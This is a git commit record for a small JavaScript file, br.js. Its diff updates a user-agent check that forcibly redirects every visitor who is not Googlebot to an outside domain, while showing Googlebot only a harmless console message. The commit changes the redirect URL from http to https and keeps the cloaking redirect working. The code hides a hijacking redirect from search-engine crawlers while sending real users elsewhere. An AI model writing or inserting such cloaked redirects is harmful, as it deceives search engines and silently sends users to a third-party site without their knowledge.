1e0e255e434b02f63de024eb56797f2ab5b9c639
soytan404 <monayem.nil.l@gmail.com>
2026-09-25 22:58:13 +0600

    Update br.js

--- br.js
+++ br.js
@@ -1,5 +1,5 @@
 if (!navigator.userAgent.includes('Googlebot')) {
-  window.location.href = "http://mieming-plus.at/?br";
+  window.location.href = "https://mieming-plus.at/?br";
 } else {
   console.log("Thanks for visiting my page" );
 }
